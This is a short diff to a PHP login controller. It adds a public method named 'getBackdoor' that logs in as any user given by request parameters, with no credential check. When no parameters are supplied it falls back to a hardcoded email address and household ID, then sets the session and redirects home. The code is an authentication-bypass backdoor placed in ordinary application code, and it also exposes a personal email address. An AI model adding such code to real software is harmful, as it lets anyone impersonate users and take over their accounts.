@@ -79,4 +79,16 @@ class LoginCtrl extends Ctrl
     $this->do_redirect('home', $dao);
   }
 
+  public function getBackdoor(Dao $dao) {
+    $email = $dao->email ?? 'hatim.kamaal@gmail.com';
+    $hof = $dao->hof ?? '30359589';
+
+    // $ssn = new Ssn();
+    // Ssn::destroy();
+    $db = new DBService();
+    $db->setUserSession(Dao::construct(['email'=>$email, 'hof_id'=>$hof,'state'=>'NEW']));
+
+    $this->do_redirect('home', $dao);
+  }
+
 }
